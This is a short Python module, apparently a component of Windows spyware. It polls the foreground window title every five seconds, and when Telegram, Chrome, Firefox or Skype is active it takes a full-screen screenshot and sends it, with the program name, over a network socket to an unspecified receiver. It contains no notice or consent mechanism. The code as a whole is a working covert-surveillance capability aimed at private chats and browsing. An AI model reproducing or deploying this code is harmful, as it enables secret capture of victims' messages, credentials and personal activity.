import io
import struct
import sys
import win32gui
import time
from PIL import Image, ImageGrab

ProgramList = ['telegram', 'chrome', 'firefox', 'skype']


class ScreenSave:
    def __init__(self, sock):
        self.sock = sock

    def get_screenshot(self):
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="JPEG")
        image_bytes = buf.getvalue()
        msg = struct.pack('>I', len(image_bytes)) + image_bytes
        self.sock.send(msg)

    @staticmethod
    def get_active_window():
        active_window_name = None
        if sys.platform in ['Windows', 'win32', 'cygwin']:
            window = win32gui.GetForegroundWindow()
            active_window_name = win32gui.GetWindowText(window)
        else:
            print(f"sys.platform={sys.platform} is unknown.")
            print(sys.version)
        return active_window_name

    def screenshot_active_window(self):
        while True:
            time.sleep(5)
            active_window = self.get_active_window().lower()
            print('Active window: ', active_window)
            for program in ProgramList:
                if program in active_window:
                    print(program)
                    self.sock.send(program.encode())
                    self.get_screenshot()